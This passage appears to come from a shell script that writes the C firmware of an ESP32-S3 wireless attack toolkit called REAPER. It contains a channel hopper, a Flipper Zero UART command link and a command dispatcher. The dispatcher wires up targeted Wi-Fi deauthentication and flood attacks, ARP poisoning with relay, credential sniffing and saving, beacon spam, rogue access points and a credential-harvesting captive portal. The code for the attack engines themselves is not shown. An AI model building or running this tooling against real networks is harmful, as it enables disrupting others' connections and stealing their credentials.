            vSemaphoreDelete(g_cfg_mutex);
            g_cfg_mutex = NULL;
        }

        if (g_stop_ack_sem != NULL) {
            vSemaphoreDelete(g_stop_ack_sem);
            g_stop_ack_sem = NULL;
        }

        ESP_LOGE(TAG, "Failed to create hopper sync objects");
        return ESP_ERR_NO_MEM;
    }

    stats_reset_all();

    xSemaphoreTake(g_cfg_mutex, portMAX_DELAY);
    g_hop_cfg.mode = CH_HOP_MODE_SEQUENTIAL;
    g_hop_cfg.dwell_ms = DEFAULT_DWELL_MS;
    g_hop_cfg.channel_mask = CH_HOP_MASK_ALL;
    g_hop_cfg.dwell_us = 0;
    xSemaphoreGive(g_cfg_mutex);

    atomic_store(&g_current_channel, 0);

    ESP_LOGI(TAG, "Channel hopper initialized");
    return ESP_OK;
}

esp_err_t channel_hopper_start(const ch_hop_config_t *cfg)
{
    if (cfg == NULL) {
        return ESP_ERR_INVALID_ARG;
    }

    if (atomic_load(&g_hop_active)) {
        return ESP_ERR_INVALID_STATE;
    }

    if (g_cfg_mutex == NULL) {
        esp_err_t ret = channel_hopper_init();
        if (ret != ESP_OK) {
            return ret;
        }
    }

    ch_hop_config_t local_cfg = *cfg;
    normalize_config(&local_cfg);

    xSemaphoreTake(g_cfg_mutex, portMAX_DELAY);
    g_hop_cfg = local_cfg;
    xSemaphoreGive(g_cfg_mutex);

    stats_reset_all();
    atomic_store(&g_current_channel, 0);

    if (g_stop_ack_sem != NULL) {
        xSemaphoreTake(g_stop_ack_sem, 0); /* drain stale ack */
    }

    atomic_store(&g_hop_active, true);

    BaseType_t rc = xTaskCreatePinnedToCore(
        channel_hopper_task,
        "ch_hopper",
        HOP_TASK_STACK,
        NULL,
        HOP_TASK_PRIO,
        &g_hop_task,
        HOP_TASK_CORE
    );

    if (rc != pdPASS) {
        atomic_store(&g_hop_active, false);
        g_hop_task = NULL;
        ESP_LOGE(TAG, "Failed to create hopper task");
        return ESP_FAIL;
    }

    ESP_LOGI(TAG,
             "Channel hopper started: mode=%s dwell_ms=%u dwell_us=%" PRIu32 " mask=0x%04X",
             mode_str(local_cfg.mode),
             (unsigned)local_cfg.dwell_ms,
             local_cfg.dwell_us,
             (unsigned)local_cfg.channel_mask);

    return ESP_OK;
}

esp_err_t channel_hopper_stop(void)
{
    if (!atomic_load(&g_hop_active)) {
        return ESP_OK;
    }

    /*
     * If called from the hopper task itself, exit directly.
     */
    if (g_hop_task != NULL && g_hop_task == xTaskGetCurrentTaskHandle()) {
        atomic_store(&g_hop_active, false);
        if (g_stop_ack_sem != NULL) {
            xSemaphoreGive(g_stop_ack_sem);
        }
        vTaskDelete(NULL);
        return ESP_OK;
    }

    atomic_store(&g_hop_active, false);

    if (g_stop_ack_sem != NULL) {
        if (xSemaphoreTake(g_stop_ack_sem, pdMS_TO_TICKS(STOP_TIMEOUT_MS)) != pdTRUE) {
            ESP_LOGW(TAG, "Hopper stop timed out; task may still be exiting");
        }
    }

    g_hop_task = NULL;

    ESP_LOGI(TAG, "Channel hopper stopped on channel %u",
             (unsigned)atomic_load(&g_current_channel));

    return ESP_OK;
}

bool channel_hopper_is_active(void)
{
    return atomic_load(&g_hop_active);
}

/* -------------------------------------------------------------------------
 *  Configuration
 * ----------------------------------------------------------------------- */

esp_err_t channel_hopper_set_dwell_us(uint32_t us)
{
    if (g_cfg_mutex == NULL) {
        return ESP_ERR_INVALID_STATE;
    }

    xSemaphoreTake(g_cfg_mutex, portMAX_DELAY);

    if (us == 0) {
        g_hop_cfg.dwell_us = 0;
        g_hop_cfg.dwell_ms = DEFAULT_DWELL_MS;
    } else if (us < 1000) {
        g_hop_cfg.dwell_us = us;
        g_hop_cfg.dwell_ms = 0;
    } else {
        uint32_t ms = us / 1000;
        g_hop_cfg.dwell_us = 0;
        g_hop_cfg.dwell_ms = clamp_u16((uint16_t)ms, MIN_DWELL_MS, MAX_DWELL_MS);
    }

    uint32_t effective_us = g_hop_cfg.dwell_us
                                ? g_hop_cfg.dwell_us
                                : (uint32_t)g_hop_cfg.dwell_ms * 1000;

    xSemaphoreGive(g_cfg_mutex);

    (void)effective_us;
    ESP_LOGI(TAG, "Dwell set to %" PRIu32 " us", effective_us);
    return ESP_OK;
}

uint32_t channel_hopper_get_dwell_us(void)
{
    if (g_cfg_mutex == NULL) {
        return DEFAULT_DWELL_MS * 1000;
    }

    xSemaphoreTake(g_cfg_mutex, portMAX_DELAY);
    uint32_t ret = g_hop_cfg.dwell_us
                       ? g_hop_cfg.dwell_us
                       : (uint32_t)g_hop_cfg.dwell_ms * 1000;
    xSemaphoreGive(g_cfg_mutex);

    return ret;
}

uint32_t channel_hopper_adaptive_dwell(uint8_t channel)
{
    if (!channel_valid(channel)) {
        return 0;
    }

    uint32_t adaptive = 0;

    taskENTER_CRITICAL(&g_stats_spin);
    adaptive = g_hop_stats[channel].adaptive_dwell_ms;
    taskEXIT_CRITICAL(&g_stats_spin);

    if (adaptive > 0) {
        return adaptive;
    }

    ch_hop_config_t cfg;
    if (get_config_snapshot(&cfg) == ESP_OK) {
        return cfg.dwell_ms;
    }

    return DEFAULT_DWELL_MS;
}

/* -------------------------------------------------------------------------
 *  Packet statistics feed
 * ----------------------------------------------------------------------- */

esp_err_t channel_hopper_record_packet(uint8_t channel,
                                       uint32_t pkt_count,
                                       uint32_t mgmt_count,
                                       uint32_t beacon_count,
                                       uint32_t data_count,
                                       int8_t rssi)
{
    if (!channel_valid(channel)) {
        return ESP_ERR_INVALID_ARG;
    }

    /*
     * This is called from the Wi-Fi worker hot path.
     * If hopper is stopped, silently ignore rather than creating error churn.
     */
    if (!atomic_load(&g_hop_active)) {
        return ESP_OK;
    }

    taskENTER_CRITICAL(&g_stats_spin);

    ch_hop_stats_t *s = &g_hop_stats[channel];

    s->pkt_count += pkt_count;
    s->mgmt_count += mgmt_count;
    s->beacon_count += beacon_count;
    s->data_count += data_count;
    s->window_pkt_count += pkt_count;

    if (pkt_count > 0) {
        s->rssi_sum += (int32_t)rssi * (int32_t)pkt_count;
        s->rssi_samples += pkt_count;
    }

    taskEXIT_CRITICAL(&g_stats_spin);

    return ESP_OK;
}

/* -------------------------------------------------------------------------
 *  Stats export
 * ----------------------------------------------------------------------- */

esp_err_t channel_hopper_get_stats(uint8_t channel, ch_hop_stats_t *out)
{
    if (out == NULL || !channel_valid(channel)) {
        return ESP_ERR_INVALID_ARG;
    }

    taskENTER_CRITICAL(&g_stats_spin);
    *out = g_hop_stats[channel];
    taskEXIT_CRITICAL(&g_stats_spin);

    return ESP_OK;
}

esp_err_t channel_hopper_get_all_stats(ch_hop_stats_t out[14])
{
    if (out == NULL) {
        return ESP_ERR_INVALID_ARG;
    }

    stats_copy_all(out);
    return ESP_OK;
}

/* -------------------------------------------------------------------------
 *  JSON export
 * ----------------------------------------------------------------------- */

static int json_append(char *buf, size_t bufsz, size_t *off, const char *fmt, ...)
{
    if (buf == NULL || bufsz == 0 || off == NULL || *off >= bufsz) {
        return 0;
    }

    va_list args;
    va_start(args, fmt);

    int n = vsnprintf(buf + *off, bufsz - *off, fmt, args);

    va_end(args);

    if (n < 0) {
        return -1;
    }

    if ((size_t)n >= bufsz - *off) {
        *off = bufsz - 1;
        return 0;
    }

    *off += (size_t)n;
    return n;
}

int channel_hopper_json(char *buf, size_t bufsz)
{
    if (buf == NULL || bufsz == 0) {
        return 0;
    }

    ch_hop_config_t cfg;
    if (get_config_snapshot(&cfg) != ESP_OK) {
        return 0;
    }

    ch_hop_stats_t stats[14];
    stats_copy_all(stats);

    size_t off = 0;

    if (json_append(buf, bufsz, &off,
                    "{\"mode\":%u,\"mode_name\":\"%s\","
                    "\"dwell_ms\":%u,\"dwell_us\":%" PRIu32 ","
                    "\"mask\":\"0x%04X\",\"channels\":[",
                    (unsigned)cfg.mode,
                    mode_str(cfg.mode),
                    (unsigned)cfg.dwell_ms,
                    cfg.dwell_us,
                    (unsigned)cfg.channel_mask) < 0) {
        return 0;
    }

    bool first = true;

    for (uint8_t ch = CH_HOP_CHANNEL_MIN; ch <= CH_HOP_CHANNEL_MAX; ch++) {
        if (!(cfg.channel_mask & (1u << (ch - 1)))) {
            continue;
        }

        const ch_hop_stats_t *s = &stats[ch];

        int32_t avg_rssi = 0;
        if (s->rssi_samples > 0) {
            avg_rssi = s->rssi_sum / (int32_t)s->rssi_samples;
        }

        if (!first) {
            if (json_append(buf, bufsz, &off, ",") < 0) {
                break;
            }
        }

        first = false;

        if (json_append(buf, bufsz, &off,
                        "{\"ch\":%u,\"pkts\":%" PRIu32 ","
                        "\"beacons\":%" PRIu32 ","
                        "\"mgmt\":%" PRIu32 ","
                        "\"data\":%" PRIu32 ","
                        "\"rssi_avg\":%" PRId32 ","
                        "\"adaptive_dwell\":%" PRIu32 "}",
                        (unsigned)ch,
                        s->pkt_count,
                        s->beacon_count,
                        s->mgmt_count,
                        s->data_count,
                        avg_rssi,
                        s->adaptive_dwell_ms) < 0) {
            break;
        }

        if (off >= bufsz - 1) {
            break;
        }
    }

    json_append(buf, bufsz, &off, "]}");

    return (int)off;
}

/* -------------------------------------------------------------------------
 *  Console summary
 * ----------------------------------------------------------------------- */

void channel_hopper_print_summary(void)
{
    ch_hop_config_t cfg;
    if (get_config_snapshot(&cfg) != ESP_OK) {
        return;
    }

    ch_hop_stats_t stats[14];
    stats_copy_all(stats);

    printf("\n==== CHANNEL HOPPER SUMMARY ====\n");
    printf(" Mode       : %s\n", mode_str(cfg.mode));
    printf(" Dwell      : %u ms", (unsigned)cfg.dwell_ms);

    if (cfg.dwell_us > 0) {
        printf(" (%" PRIu32 " us override)", cfg.dwell_us);
    }

    printf("\n");
    printf(" Mask       : 0x%04X\n", (unsigned)cfg.channel_mask);
    printf(" Active     : %s\n", atomic_load(&g_hop_active) ? "yes" : "no");
    printf(" Current CH : %u\n", (unsigned)atomic_load(&g_current_channel));

    printf("\n");
    printf(" CH | PKTS    | BEACONS | MGMT    | DATA    | RSSI_AVG | ADAPT_MS\n");
    printf("----+---------+---------+---------+---------+----------+----------\n");

    for (uint8_t ch = CH_HOP_CHANNEL_MIN; ch <= CH_HOP_CHANNEL_MAX; ch++) {
        const ch_hop_stats_t *s = &stats[ch];

        int32_t avg = 0;
        if (s->rssi_samples > 0) {
            avg = s->rssi_sum / (int32_t)s->rssi_samples;
        }

        printf(" %-2u | %7" PRIu32 " | %7" PRIu32 " | %7" PRIu32
               " | %7" PRIu32 " | %8" PRId32 " | %8" PRIu32 "\n",
               ch,
               s->pkt_count,
               s->beacon_count,
               s->mgmt_count,
               s->data_count,
               avg,
               s->adaptive_dwell_ms);
    }

    printf("================================\n");
}
EOF_REAPER_FILE
echo "  Updated ${TARGET_DIR}/channel_hopper.c"

cat << 'EOF_REAPER_FILE' > "${TARGET_DIR}/channel_hopper.h"
#ifndef CHANNEL_HOPPER_H
#define CHANNEL_HOPPER_H

#include <stdint.h>
#include <stdbool.h>

#include "esp_err.h"
#include "common_types.h"

#ifdef __cplusplus
extern "C" {
#endif

#define CH_HOP_CHANNEL_MIN  1
#define CH_HOP_CHANNEL_MAX  13
#define CH_HOP_MASK_ALL     ((uint16_t)0x1FFFu)

/*
 * Smart channel hopper: configurable dwell time, sequential/random
 * traversal, and per-channel packet/RSSI statistics.
 *
 * Intended to be the single authoritative hopper shared by sniffer,
 * analyzer, and future radio subsystems.
 */

typedef enum {
    CH_HOP_MODE_SEQUENTIAL = 0,
    CH_HOP_MODE_RANDOM     = 1,
    CH_HOP_MODE_RSSI_OPT   = 2,
    CH_HOP_MODE_ADAPTIVE   = 3
} ch_hop_mode_t;

typedef struct {
    ch_hop_mode_t mode;

    /*
     * Dwell time in milliseconds.
     * 0 means default 100 ms.
     * Valid range is clamped internally.
     */
    uint16_t dwell_ms;

    /*
     * bit0 = channel 1 ... bit12 = channel 13.
     * Must be uint16_t, not uint8_t, to represent all 13 channels.
     */
    uint16_t channel_mask;

    /*
     * Optional microsecond dwell override.
     * If non-zero, this overrides dwell_ms.
     * Values below 1000 use busy-wait for sub-millisecond dwell.
     */
    uint32_t dwell_us;
} ch_hop_config_t;

typedef struct {
    uint32_t pkt_count;
    uint32_t beacon_count;
    uint32_t mgmt_count;
    uint32_t data_count;

    int32_t  rssi_sum;
    uint32_t rssi_samples;

    uint32_t adaptive_dwell_ms;

    /*
     * Packet count observed during the current dwell window.
     * Used by adaptive dwell logic.
     */
    uint32_t window_pkt_count;
    uint64_t window_start_us;
} ch_hop_stats_t;

/*
 * Initialize channel hopper state.
 * Must be called once before channel_hopper_start().
 */
esp_err_t channel_hopper_init(void);

/*
 * Start hopping with the given config.
 * Requires Wi-Fi already in promiscuous mode.
 */
esp_err_t channel_hopper_start(const ch_hop_config_t *cfg);

/*
 * Stop hopping and retain last collected stats.
 */
esp_err_t channel_hopper_stop(void);

/*
 * Query whether the hopper task is currently active.
 */
bool channel_hopper_is_active(void);

/*
 * Set microsecond dwell override.
 *
 * If us == 0, restore default millisecond dwell.
 * If us < 1000, use sub-millisecond busy-wait dwell.
 * If us >= 1000, convert to clamped millisecond dwell.
 */
esp_err_t channel_hopper_set_dwell_us(uint32_t us);

/*
 * Get current effective dwell in microseconds.
 */
uint32_t channel_hopper_get_dwell_us(void);

/*
 * Get adaptive dwell for a channel.
 * Returns 0 if channel invalid.
 */
uint32_t channel_hopper_adaptive_dwell(uint8_t channel);

/*
 * Retrieve statistics for a single 1..13 channel.
 */
esp_err_t channel_hopper_record_packet(uint8_t channel,
                                       uint32_t pkt_count,
                                       uint32_t mgmt_count,
                                       uint32_t beacon_count,
                                       uint32_t data_count,
                                       int8_t rssi);

esp_err_t channel_hopper_get_stats(uint8_t channel, ch_hop_stats_t *out);

/*
 * Snapshot all 14 stat slots into out.
 * Index 0 is unused; channels are stored at out[1..13].
 */
esp_err_t channel_hopper_get_all_stats(ch_hop_stats_t out[14]);

/*
 * Export summary as JSON into provided buffer.
 * Returns number of bytes written, not including NUL.
 */
int channel_hopper_json(char *buf, size_t bufsz);

/*
 * Human-readable summary to stdout.
 */
void channel_hopper_print_summary(void);

#ifdef __cplusplus
}
#endif

#endif /* CHANNEL_HOPPER_H */
EOF_REAPER_FILE
echo "  Updated ${TARGET_DIR}/channel_hopper.h"

cat << 'EOF_REAPER_FILE' > "${TARGET_DIR}/cli_flipper.c"
#include "cli_flipper.h"
#include "cli_module.h"

#include <string.h>
#include <stdio.h>
#include <stdarg.h>
#include <ctype.h>
#include <stdatomic.h>

#include "esp_log.h"
#include "esp_err.h"
#include "esp_timer.h"
#include "driver/uart.h"
#include "driver/gpio.h"

#include "freertos/FreeRTOS.h"
#include "freertos/task.h"

static const char *TAG = "flipper";

#define FLIPPER_UART       UART_NUM_1
#define FLIPPER_BAUD       115200
#define FLIPPER_RX_BUF     2048
#define FLIPPER_TX_BUF     1024
#define FLIPPER_RXD        GPIO_NUM_19
#define FLIPPER_TXD        GPIO_NUM_20

#define FLIPPER_TIMEOUT_US 5000000ULL /* 5 seconds */

static atomic_bool g_connected = false;
static atomic_uint_least64_t g_last_rx_us = 0;
static TaskHandle_t g_task = NULL;
static atomic_bool g_running = false;

/* =========================================================================
 *  Background Task
 * ========================================================================= */

static void flipper_task(void *arg)
{
    (void)arg;
    char line[256];
    
    while (atomic_load(&g_running)) {
        int n = cli_flipper_read_line(line, sizeof(line), 1000);
        if (n > 0) {
            atomic_store(&g_last_rx_us, esp_timer_get_time());
            atomic_store(&g_connected, true);
            
            /* Safe tokenization using ctype.h */
            int argc = 0;
            char *argv[16];
            char *p = line;
            
            while (*p && argc < 16) {
                while (isspace((unsigned char)*p)) p++;
                if (*p == '\0') break;
                argv[argc++] = p;
                while (*p && !isspace((unsigned char)*p)) p++;
                if (*p) *p++ = '\0';
            }
            
            if (argc > 0) {
                cli_dispatch_command(argc, argv);
            }
        } else {
            /* Check for connection timeout */
            if (atomic_load(&g_connected)) {
                uint64_t last_rx = atomic_load(&g_last_rx_us);
                if (esp_timer_get_time() - last_rx > FLIPPER_TIMEOUT_US) {
                    atomic_store(&g_connected, false);
                }
            }
        }
    }
    
    vTaskDelete(NULL);
}

/* =========================================================================
 *  Public API
 * ========================================================================= */

esp_err_t cli_flipper_init(void)
{
    if (atomic_load(&g_running)) return ESP_OK;

    atomic_store(&g_running, true);
    atomic_store(&g_connected, false);
    atomic_store(&g_last_rx_us, 0);

    uart_config_t cfg = {
        .baud_rate  = FLIPPER_BAUD,
        .data_bits  = UART_DATA_8_BITS,
        .parity     = UART_PARITY_DISABLE,
        .stop_bits  = UART_STOP_BITS_1,
        .flow_ctrl  = UART_HW_FLOWCTRL_DISABLE,
        .source_clk = UART_SCLK_DEFAULT,
    };
    
    esp_err_t rc = uart_param_config(FLIPPER_UART, &cfg);
    if (rc != ESP_OK) goto fail;

    rc = uart_set_pin(FLIPPER_UART, FLIPPER_TXD, FLIPPER_RXD,
                      UART_PIN_NO_CHANGE, UART_PIN_NO_CHANGE);
    if (rc != ESP_OK) goto fail;

    rc = uart_driver_install(FLIPPER_UART, FLIPPER_RX_BUF, FLIPPER_TX_BUF,
                             0, NULL, 0);
    if (rc != ESP_OK && rc != ESP_ERR_INVALID_STATE) goto fail;

    if (xTaskCreatePinnedToCore(flipper_task, "flipper", 3072, NULL, 4,
                                &g_task, 0) != pdPASS) {
        rc = ESP_ERR_NO_MEM;
        goto fail;
    }

    ESP_LOGI(TAG, "Flipper UART1 init @ %d baud (TXD=%d RXD=%d)",
             FLIPPER_BAUD, FLIPPER_TXD, FLIPPER_RXD);
    return ESP_OK;

fail:
    atomic_store(&g_running, false);
    return rc;
}

esp_err_t cli_flipper_deinit(void)
{
    if (!atomic_load(&g_running)) return ESP_OK;

    atomic_store(&g_running, false);
    
    if (g_task != NULL) {
        /* Wait for task to exit cleanly before deleting UART driver */
        vTaskDelay(pdMS_TO_TICKS(500));
        g_task = NULL;
    }
    
    uart_driver_delete(FLIPPER_UART);
    atomic_store(&g_connected, false);
    return ESP_OK;
}

bool cli_flipper_connected(void)
{
    return atomic_load(&g_connected);
}

int cli_flipper_read_line(char *buf, size_t cap, uint32_t timeout_ms)
{
    if (cap == 0 || buf == NULL) return -1;
    size_t i = 0;
    
    for (;;) {
        uint8_t c = 0;
        int n = uart_read_bytes(FLIPPER_UART, &c, 1, pdMS_TO_TICKS(timeout_ms));
        if (n != 1) {
            return (i > 0) ? (int)i : -1;
        }
        
        if (c == '\r' || c == '\n') {
            if (i == 0) continue;
            buf[i] = '\0';
            return (int)i;
        }
        
        if (c == 0x08 || c == 0x7F) { /* Backspace / DEL */
            if (i > 0) i--;
            continue;
        }
        
        if (i < cap - 1) {
            buf[i++] = (char)c;
        }
    }
}

int cli_flipper_write(const void *data, size_t len)
{
    if (data == NULL || len == 0) return 0;
    return uart_write_bytes(FLIPPER_UART, (const uint8_t *)data, len);
}

int cli_flipper_printf(const char *fmt, ...)
{
    char buf[256];
    va_list ap;
    va_start(ap, fmt);
    int n = vsnprintf(buf, sizeof(buf), fmt, ap);
    va_end(ap);
    
    if (n > 0) {
        if (n >= (int)sizeof(buf)) n = sizeof(buf) - 1;
        cli_flipper_write(buf, (size_t)n);
    }
    return n;
}

esp_err_t cli_flipper_send_event(const char *json)
{
    if (json == NULL) return ESP_ERR_INVALID_ARG;
    
    /* FIXED: Use printf to avoid manual length calculation errors */
    cli_flipper_printf("{\"event\":%s}\r\n", json);
    
    return ESP_OK;
}
EOF_REAPER_FILE
echo "  Updated ${TARGET_DIR}/cli_flipper.c"

cat << 'EOF_REAPER_FILE' > "${TARGET_DIR}/cli_module.c"
/*
 * ============================================================================
 *  cli_module.c  —  Unified command dispatcher for the REAPER CLI
 * ============================================================================
 */

#include "cli_module.h"
#include "cli_transport.h"
#include "led_indicator.h"
#include "wifi_sniffer.h"
#include "ble_scanner.h"
#include "storage_sd.h"
#include "deauth_engine.h"
#include "arp_poison.h"
#include "pcap_ring.h"
#include "cred_sniffer.h"
#include "beacon_spam.h"
#include "extra_offense.h"

#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <inttypes.h>

#include "esp_system.h"
#include "esp_timer.h"

#include "freertos/FreeRTOS.h"
#include "freertos/task.h"


static uint32_t arg_to_u32(const char *s, uint32_t def)
{
    if (s == NULL || s[0] == '\0') return def;
    char *end = NULL;
    unsigned long v = strtoul(s, &end, 10);
    if (end == s) return def;
    return (uint32_t)v;
}

static void cli_print_help(void)
{
    const cli_transport_t *t = cli_transport_get();
    if (!t || !t->printf) return;

    t->printf("\nESP32-S3 Wireless Lab Toolkit\n");
    t->printf("Commands:\n");
    t->printf("  help\n");
    t->printf("  reboot\n");
    t->printf("\n");
    t->printf("  led off | idle | scan | conn | error\n");
    t->printf("  led rgb <r> <g> <b>\n");
    t->printf("\n");
    t->printf("  storage status\n");
    t->printf("\n");
    t->printf("  wifi start [seconds]\n");
    t->printf("  wifi pcap [seconds]\n");
    t->printf("  wifi stop\n");
    t->printf("  wifi results\n");
    t->printf("  wifi stats\n");
    t->printf("\n");
    t->printf("  ble start [seconds]\n");
    t->printf("  ble stop\n");
    t->printf("  ble results\n");
    t->printf("  ble trackers\n");
    t->printf("\n");
    t->printf("  adv start [seconds] [name]\n");
    t->printf("  adv stop\n");
    t->printf("\n");
    t->printf("  deauth ap <bssid> [count] [mode]\n");
    t->printf("  deauth client <bssid> <client> [count] [mode]\n");
    t->printf("  deauth stop\n");
    t->printf("  deauth list\n");
    t->printf("\n");
    t->printf("  arp poison <victim_ip> [gateway_ip] [interval_ms]\n");
    t->printf("  arp stop | status | table\n");
    t->printf("  arp relay on|off\n");
    t->printf("\n");
    t->printf("  pcap start [secs] | stop | info | wipe\n");
    t->printf("  pcap save [path] | export\n");
    t->printf("\n");
    t->printf("  save wifi\n");
    t->printf("  save ble\n");
    t->printf("\n");
    t->printf("  creds on|off|show|clear|save\n");
    t->printf("\n");
    t->printf("  beacon spam [ch] | stop\n");
    t->printf("  rogue start <ssid> [ch] [open|wpa2] | stop\n");
    t->printf("  portal start <ssid> [ch] | stop | creds\n");
    t->printf("\n");
    t->printf("  probe start <ssid> <count> [ch] | stop\n");
    t->printf("  doj start <bssid> | stop\n");
    t->printf("  oui <mac>\n");
    t->printf("  analyzer [seconds_per_channel]\n");
}

void cli_dispatch_command(int argc, char *argv[])
{
    const cli_transport_t *t = cli_transport_get();

    if (argc == 0 || argv[0] == NULL) return;

    if (strcmp(argv[0], "help") == 0) {
        cli_print_help();
    } else if (strcmp(argv[0], "reboot") == 0) {
        esp_restart();
    } else if (strcmp(argv[0], "storage") == 0) {
        if (argc >= 2 && strcmp(argv[1], "status") == 0) {
            if (storage_is_ready()) {
                if (t && t->printf) t->printf("SD card ready.\n");
                /* Note: Ensure g_sd_card is extern in storage_sd.h */
                storage_sd_print_info(stdout);
            } else {
                if (t && t->printf) t->printf("SD card not ready.\n");
            }
        } else {
            if (t && t->printf) t->printf("Usage: storage status\n");
        }
    } else if (strcmp(argv[0], "led") == 0) {
        if (argc < 2) {
            if (t && t->printf) t->printf("Usage: led off|idle|scan|conn|error|rgb\n");
        } else if (strcmp(argv[1], "off") == 0) {
            led_set_state(LED_STATE_OFF);
        } else if (strcmp(argv[1], "idle") == 0) {
            led_set_state(LED_STATE_IDLE);
        } else if (strcmp(argv[1], "scan") == 0) {
            led_set_state(LED_STATE_SCANNING);
        } else if (strcmp(argv[1], "conn") == 0) {
            led_set_state(LED_STATE_CONNECTED);
        } else if (strcmp(argv[1], "error") == 0) {
            led_set_state(LED_STATE_ERROR);
        } else if (strcmp(argv[1], "rgb") == 0) {
            if (argc >= 5) {
                uint8_t r = (uint8_t)(arg_to_u32(argv[2], 0) & 0xFF);
                uint8_t g = (uint8_t)(arg_to_u32(argv[3], 0) & 0xFF);
                uint8_t b = (uint8_t)(arg_to_u32(argv[4], 0) & 0xFF);
                led_set_rgb(r, g, b);
            } else {
                if (t && t->printf) t->printf("Usage: led rgb <r> <g> <b>\n");
            }
        } else {
            if (t && t->printf) t->printf("Unknown led mode\n");
        }
    } else if (strcmp(argv[0], "wifi") == 0) {
        if (argc < 2) {
            if (t && t->printf) t->printf("Usage: wifi start|pcap|stop|results|stats\n");
        } else if (strcmp(argv[1], "start") == 0) {
            uint32_t duration = arg_to_u32(argv[2], 10);
            esp_err_t ret = wifi_sniffer_start(duration);
            if (ret != ESP_OK) {
                if (t && t->printf) t->printf("wifi start failed: %s\n", esp_err_to_name(ret));
            } else if (duration > 0) {
                if (t && t->printf) t->printf("Wi-Fi sniffer running for %u s. Use 'wifi stop'.\n", (unsigned)duration);
            } else {
                if (t && t->printf) t->printf("Wi-Fi sniffer running indefinitely. Use 'wifi stop'.\n");
            }
        } else if (strcmp(argv[1], "pcap") == 0) {
            uint32_t duration = arg_to_u32(argv[2], 10);
            esp_err_t ret = wifi_sniffer_start_pcap(duration);
            if (ret != ESP_OK) {
                if (t && t->printf) t->printf("wifi pcap failed: %s\n", esp_err_to_name(ret));
            } else if (duration > 0) {
                if (t && t->printf) t->printf("Wi-Fi PCAP running for %u s. Use 'wifi stop'.\n", (unsigned)duration);
            } else {
                if (t && t->printf) t->printf("Wi-Fi PCAP running indefinitely. Use 'wifi stop'.\n");
            }
        } else if (strcmp(argv[1], "stop") == 0) {
            wifi_sniffer_stop();
        } else if (strcmp(argv[1], "results") == 0) {
            wifi_sniffer_print_results();
        } else if (strcmp(argv[1], "stats") == 0) {
            wifi_sniffer_print_stats();
        } else {
            if (t && t->printf) t->printf("Unknown wifi command\n");
        }
    } else if (strcmp(argv[0], "ble") == 0) {
        if (argc < 2) {
            if (t && t->printf) t->printf("Usage: ble start|stop|results|trackers\n");
        } else if (strcmp(argv[1], "start") == 0) {
            uint32_t duration = arg_to_u32(argv[2], 10);
            esp_err_t ret = ble_scanner_start(duration);
            if (ret != ESP_OK) {
                if (t && t->printf) t->printf("ble start failed: %s\n", esp_err_to_name(ret));
            } else if (duration > 0) {
                if (t && t->printf) t->printf("BLE scan running for %u s. Use 'ble stop'.\n", (unsigned)duration);
            } else {
                if (t && t->printf) t->printf("BLE scan running indefinitely. Use 'ble stop'.\n");
            }
        } else if (strcmp(argv[1], "stop") == 0) {
            ble_scanner_stop();
        } else if (strcmp(argv[1], "results") == 0) {
            ble_scanner_print_results();
        } else if (strcmp(argv[1], "trackers") == 0) {
            ble_tracker_print();
        } else {
            if (t && t->printf) t->printf("Unknown ble command\n");
        }
    } else if (strcmp(argv[0], "adv") == 0) {
        if (argc < 2) {
            if (t && t->printf) t->printf("Usage: adv start|stop\n");
        } else if (strcmp(argv[1], "start") == 0) {
            uint32_t duration = arg_to_u32(argv[2], 10);
            const char *name = (argc >= 4) ? argv[3] : "ESP32-S3-LAB";
            esp_err_t ret = ble_advertise_start(name, duration);
            if (ret != ESP_OK) {
                if (t && t->printf) t->printf("adv start failed: %s\n", esp_err_to_name(ret));
            } else {
                if (t && t->printf) t->printf("BLE identification advertisement started.\n");
            }
        } else if (strcmp(argv[1], "stop") == 0) {
            ble_advertise_stop();
        } else {
            if (t && t->printf) t->printf("Unknown adv command\n");
        }
    } else if (strcmp(argv[0], "deauth") == 0) {
        if (argc < 2) {
            if (t && t->printf) {
                t->printf("Usage:\n");
                t->printf("  deauth ap <bssid> [count=100] [mode]         - Deauth all clients on AP\n");
                t->printf("  deauth client <bssid> <client> [count] [mode] - Deauth specific client\n");
                t->printf("  deauth stop\n");
                t->printf("  deauth list\n");
            }
        } else if (strcmp(argv[1], "ap") == 0 && argc >= 3) {
            uint8_t bssid[6];
            if (sscanf(argv[2], "%02hhx:%02hhx:%02hhx:%02hhx:%02hhx:%02hhx",
                       &bssid[0], &bssid[1], &bssid[2], &bssid[3], &bssid[4], &bssid[5]) != 6) {
                if (t && t->printf) t->printf("Invalid BSSID format\n");
            } else {
                uint32_t count = arg_to_u32(argv[3], 100);
                deauth_mode_t mode = DEAUTH_MODE_FALLBACK_CHAIN;
                if (argc >= 5) {
                    if (strcmp(argv[4], "deauth") == 0) mode = DEAUTH_MODE_DEAUTH_ONLY;
                    else if (strcmp(argv[4], "disassoc") == 0) mode = DEAUTH_MODE_DISASSOC_ONLY;
                    else if (strcmp(argv[4], "auth") == 0) mode = DEAUTH_MODE_AUTH_FLOOD_ONLY;
                }
                deauth_remove_all();
                
                /* FIXED: Use add_target + start to support custom modes */
                deauth_add_target(bssid, NULL, count, 0, mode);
                deauth_start();
            }
        } else if (strcmp(argv[1], "client") == 0 && argc >= 4) {
            uint8_t bssid[6], client[6];
            if (sscanf(argv[2], "%02hhx:%02hhx:%02hhx:%02hhx:%02hhx:%02hhx",
                       &bssid[0], &bssid[1], &bssid[2], &bssid[3], &bssid[4], &bssid[5]) != 6 ||
                sscanf(argv[3], "%02hhx:%02hhx:%02hhx:%02hhx:%02hhx:%02hhx",
                       &client[0], &client[1], &client[2], &client[3], &client[4], &client[5]) != 6) {
                if (t && t->printf) t->printf("Invalid MAC format\n");
            } else {
                uint32_t count = arg_to_u32(argv[4], 50);
                deauth_mode_t mode = DEAUTH_MODE_FALLBACK_CHAIN;
                if (argc >= 6) {
                    if (strcmp(argv[5], "deauth") == 0) mode = DEAUTH_MODE_DEAUTH_ONLY;
                    else if (strcmp(argv[5], "disassoc") == 0) mode = DEAUTH_MODE_DISASSOC_ONLY;
                    else if (strcmp(argv[5], "auth") == 0) mode = DEAUTH_MODE_AUTH_FLOOD_ONLY;
                }
                deauth_remove_all();
                deauth_add_target(bssid, client, count, 0, mode);
                deauth_start();
            }
        } else if (strcmp(argv[1], "stop") == 0) {
            deauth_stop();
            deauth_remove_all();
        } else if (strcmp(argv[1], "list") == 0) {
            /* FIXED: Use public API instead of static variables */
            uint8_t count = deauth_get_target_count();
            if (t && t->printf) t->printf("Deauth targets: %d\n", count);
            
